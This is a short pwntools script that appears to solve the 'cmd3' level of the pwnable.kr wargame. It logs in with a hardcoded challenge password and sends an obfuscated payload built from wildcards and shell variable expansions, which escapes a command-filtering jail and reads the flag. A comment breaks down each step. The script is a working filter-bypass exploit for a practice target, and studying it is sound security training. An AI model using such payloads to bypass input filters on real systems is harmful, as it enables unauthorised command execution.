from pwn import *

conn = ssh(host="pwnable.kr", port=2222, user="cmd3", password="FuN_w1th_5h3ll_v4riabl3s_haha")
poc = "????/???;${__=${_#?????}};$($__</???/__/?);${___=$_};$__<$___"

'''
????/???        jail/cat
$_              jail/cat
${_#?????}      cat
$__             cat
$__</???/__/?   cat</tmp/___/1
$_              flagname
$___            flagname
$__<$___        cat<flagname
'''

p = conn.run("nc 0 9023")
p.recvuntil("password is in ")
filepath = p.recvline()         # flagbox/...

conn.run("mkdir /tmp/__")
conn.run('echo "{0}" >/tmp/__/1'.format(filepath))

p.recvuntil("cmd3$ ")
p.sendline(poc)
pwd = p.recvuntil("cmd3$ ")[-38:-6]

p.sendline(pwd)
log.success(p.recvall())
